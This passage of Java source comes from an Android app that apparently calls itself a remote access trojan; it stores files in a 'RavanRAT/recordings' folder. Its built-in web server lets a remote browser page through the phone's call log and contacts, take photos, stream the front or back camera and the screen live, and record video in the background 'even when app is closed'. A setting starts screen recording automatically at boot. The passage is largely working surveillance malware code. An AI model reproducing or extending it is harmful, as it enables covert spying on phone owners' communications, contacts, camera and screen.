                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            // Query for call logs - compatible with Android 13+
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    // Skip to offset
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    // Limit results
                    if (count >= limit)
                        break;

                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In";
                            typeClass = "call-incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out";
                            typeClass = "call-outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked";
                            typeClass = "call-missed";
                            break;
                        default:
                            typeIcon = "&#128222; Other";
                            typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td>").append(
                            new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td>").append(formatDuration(duration)).append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        if (i == page) {
                            html.append("<a class=\"active\" href=\"/calls?page=").append(i).append("\">").append(i)
                                    .append("</a>");
                        } else {
                            html.append("<a href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                        }
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                    }
                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    if (count >= limit)
                        break;

                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    String initial = name != null && !name.isEmpty() ? name.substring(0, 1).toUpperCase() : "?";

                    html.append("<tr>");
                    html.append("<td style=\"display: flex; align-items: center;\">");
                    html.append("<div class=\"contact-avatar\">").append(initial).append("</div>");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "N/A").append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        if (i == page) {
                            html.append("<a class=\"active\" href=\"/contacts?page=").append(i).append("\">").append(i)
                                    .append("</a>");
                        } else {
                            html.append("<a href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                        }
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                    }
                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serve404() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<p>The requested page does not exist.</p>" +
                "<a href=\"/\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 10px; color: white; text-decoration: none;\">Go Home</a>"
                +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }

    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }

    private String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    private String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    private String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format("%dm %ds", seconds / 60, seconds % 60);
        return String.format("%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    // ============ Camera Methods ============

    private Response serveCameraPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // List available cameras using CameraHelper
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();

        if (cameras.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
            html.append("<p>No cameras available</p>");
            html.append("</div>");
        } else {
            // Photo Capture Section
            html.append("<div class=\"info-section\">");
            html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
                String bgColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.2)" : "rgba(52, 152, 219, 0.2)";
                String borderColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.3)" : "rgba(52, 152, 219, 0.3)";
                String textColor = cam.facing.equals("Front") ? "#9b59b6" : "#3498db";

                html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
                        .append(cam.facing).append(" Camera</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
                        .append(cam.width).append(" x ").append(cam.height).append("</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Live Streaming Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
                        .append("</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Screen View Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #f1c40f; margin-bottom: 15px;\">&#128187; Phone Screen</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View the phone screen live in your browser.</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");
            html.append("<a href=\"/screen\" ");
            html.append("style=\"padding: 25px 20px; background: rgba(241, 196, 15, 0.2); ");
            html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
            html.append("border: 1px solid rgba(241, 196, 15, 0.3); display: block;\">");
            html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">&#128187;</div>");
            html.append("<div style=\"color: #f1c40f; font-weight: 600;\">Phone Screen</div>");
            html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Open screen viewer</div>");
            html.append("</a>");
            html.append("</div>");
            html.append("</div>");

            // Video Recording Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
            html.append(
                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
                html.append("&#127909; Record ").append(cam.facing);
                html.append("</button>");
            }

            html.append("<button onclick=\"stopRecording()\" ");
            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
            html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
            html.append("&#9632; Stop Recording");
            html.append("</button>");
            html.append("</div>");

            // JavaScript for recording
            html.append("<script>");
            html.append("function startRecording(camId) {");
            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
            html.append("  });");
            html.append("}");
            html.append("function stopRecording() {");
            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
            html.append("  });");
            html.append("}");
            html.append("function checkRecStatus() {");
            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
            html.append("    if (d.recording) {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
            html.append("    } else {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
            html.append("    }");
            html.append("  });");
            html.append("}");
            html.append("checkRecStatus();");
            html.append("setInterval(checkRecStatus, 2000);");
            html.append("</script>");

            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveScreenPage() {
        boolean autoScreenRecordEnabled = isAutoScreenRecordEnabled();
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Screen Recording</h2>");
        html.append("<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 20px;\">Record the device screen to an MP4 file. Grant screen capture permission when prompted.</p>");

        html.append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; margin-bottom: 20px;\">");
        html.append("<button onclick=\"startRecording()\" style=\"padding: 14px 24px; border:none; border-radius: 10px; background: linear-gradient(135deg, #2ecc71, #27ae60); color:#fff; cursor:pointer; font-weight:600;\">Start Recording</button>");
        html.append("<button onclick=\"stopRecording()\" style=\"padding: 14px 24px; border:none; border-radius: 10px; background: linear-gradient(135deg, #e74c3c, #c0392b); color:#fff; cursor:pointer; font-weight:600;\">Stop Recording</button>");
        html.append("</div>");

        html.append("<div class=\"card\" style=\"margin-bottom: 20px;\">");
        html.append("<h3 style=\"margin-bottom: 15px;\">&#9881; Boot Options</h3>");
        html.append("<div style=\"display: flex; align-items: center; gap: 10px; flex-wrap: wrap;\">");
        html.append("<span style=\"color: #888;\">Auto-start screen recording on app boot:</span>");
        html.append("<a href=\"/screen/settings?auto_boot=").append(!autoScreenRecordEnabled).append("\" style=\"text-decoration: none;\">");
        html.append("<div style=\"width: 50px; height: 26px; background: ").append(autoScreenRecordEnabled ? "#2ecc71" : "#555").append("; border-radius: 13px; position: relative; display: inline-block; vertical-align: middle;\">");
        html.append("<div style=\"position: absolute; width: 22px; height: 22px; background: #fff; border-radius: 50%; top: 2px; left: ")
                .append(autoScreenRecordEnabled ? "26px;" : "2px;").append(" transition: left 0.3s;\"></div>");
        html.append("</div></a>");
        html.append("</div>");
        html.append("</div>");

        html.append("<div id=\"rec-status\" style=\"text-align: center; color: #888; margin-bottom: 20px;\">Status: Not recording</div>");

        // List recordings
        html.append("<div class=\"card\" style=\"margin-top: 10px;\"><h3 style=\"margin-bottom: 10px;\">Recordings</h3>");
        File recDir = new File(Environment.getExternalStorageDirectory(), "RavanRAT/recordings");
        if (recDir.exists() && recDir.isDirectory()) {
            File[] files = recDir.listFiles();
            if (files != null && files.length > 0) {
                html.append("<ul class=\"file-list\">");
                for (File f : files) {
                    String name = f.getName();
                    String path = "RavanRAT/recordings/" + name;
                    String encodedPath;
                    try {
                        encodedPath = java.net.URLEncoder.encode(path, "UTF-8");
                    } catch (java.io.UnsupportedEncodingException e) {
                        encodedPath = path;
                    }
                    html.append("<li class=\"file-item\"><div class=\"file-info\"><a class=\"file-name\" href=\"/download/").append(path).append("\">"+ escapeHtml(name) +"</a><div class=\"file-meta\">"+ (f.length()/1024) +" KB</div></div>");
                    html.append("<button onclick=\"deletePath('" + encodedPath + "')\" style=\"padding: 8px 12px; margin-left: 12px; background: rgba(231, 76, 60, 0.12); border: 1px solid #e74c3c; border-radius: 8px; color: #e74c3c; cursor: pointer; font-size: 0.85rem;\">Delete</button>");
                    html.append("</li>");
                }
                html.append("</ul>");
            } else {
                html.append("<div class=\"empty-state\">No recordings yet.</div>");
            }
        } else {
            html.append("<div class=\"empty-state\">No recordings directory found.</div>");
        }
        html.append("</div>");

        html.append("<script>");
        html.append("function startRecording() { fetch('/screen/start_record').then(r=>r.json()).then(d=>{  }); }");
        html.append("function stopRecording() { fetch('/screen/stop_record').then(r=>r.json()).then(d=>{  window.location.reload(); }); }");
        html.append("function deletePath(path) { if (!confirm('Delete this recording?')) return; fetch('/file/delete?path=' + path).then(r=>r.json()).then(d=>{ if (d.success) { window.location.reload(); } else { alert('Delete failed: ' + (d.message || 'Unknown error')); } }).catch(e=>{ alert('Delete failed: ' + e.message); }); }");
        html.append("function checkRecordingStatus() { fetch('/screen/status').then(r=>r.json()).then(d=>{ if (d.recording) { document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording</span>'; } else { document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>'; } }); }");
        html.append("checkRecordingStatus(); setInterval(checkRecordingStatus, 2500);");
        html.append("</script>");

        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response startScreenRecording() {
        try {
            Intent intent = new Intent(context, MainActivity.class);
            intent.setAction("REQUEST_SCREEN_CAPTURE_RECORD");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            context.startActivity(intent);
            String json = "{\"success\": true, \"message\": \"Screen recording permission requested in the app\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            String errorMsg = e.getClass().getSimpleName() + ": " + escapeJson(e.getMessage());
            String json = "{\"success\": false, \"message\": \"Failed to request recording: " + errorMsg + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
    }

    private Response stopScreenRecording() {
        try {
            Intent serviceIntent = new Intent(context, ScreenRecordService.class);
            serviceIntent.setAction("STOP_RECORD");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            String json = "{\"success\": true, \"message\": \"Stop recording requested\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            String json = "{\"success\": false, \"message\": \"Error stopping recording: " + escapeJson(e.getMessage()) + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
    }

    private Response startScreenCapture() {
        if (ScreenCaptureManager.isActive()) {
            String json = "{\"success\": true, \"message\": \"Screen capture already active\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
        try {
            Intent intent = new Intent(context, MainActivity.class);
            intent.setAction("REQUEST_SCREEN_CAPTURE");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
            context.startActivity(intent);
            String json = "{\"success\": true, \"message\": \"Screen capture permission requested in the app\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            String errorMsg = e.getClass().getSimpleName() + ": " + escapeJson(e.getMessage());
            String json = "{\"success\": false, \"message\": \"Failed to request screen capture: " + errorMsg + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
    }

    private Response stopScreenCapture() {
        try {
            ScreenCaptureManager.stopProjection();
            String json = "{\"success\": true, \"message\": \"Screen capture stopped\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            String json = "{\"success\": false, \"message\": \"Error stopping screen capture: " + escapeJson(e.getMessage()) + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
    }

    private boolean isAutoScreenRecordEnabled() {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(PREF_AUTO_SCREEN_RECORD_BOOT, false);
    }

    private Response updateScreenSettings(Map<String, String> params) {
        boolean autoBoot = "true".equalsIgnoreCase(params.get("auto_boot"));
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putBoolean(PREF_AUTO_SCREEN_RECORD_BOOT, autoBoot).apply();

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/screen\"></head><body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveScreenFrame() {
        try {
            byte[] frame = ScreenCaptureManager.getNextFrame(200);
            if (frame != null && frame.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
                response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
                response.addHeader("Pragma", "no-cache");
                response.addHeader("Expires", "0");
                return response;
            }
            return newFixedLengthResponse(Response.Status.NO_CONTENT, "text/plain", "");
        } catch (Exception e) {
            return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Error retrieving frame: " + e.getMessage());
        }
    }

    private Response serveScreenStatus() {
        try {
            boolean recording = false;
            try {
                recording = ScreenRecordService.isRecording();
            } catch (Throwable t) {
                recording = false;
            }
            String json = "{\"recording\": " + recording + "}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        } catch (Exception e) {
            String json = "{\"recording\": false, \"error\": \"" + escapeJson(e.getMessage()) + "\"}";
            return newFixedLengthResponse(Response.Status.OK, "application/json", json);
        }
    }

    private Response serveCameraCapture(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; // Default to back camera
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
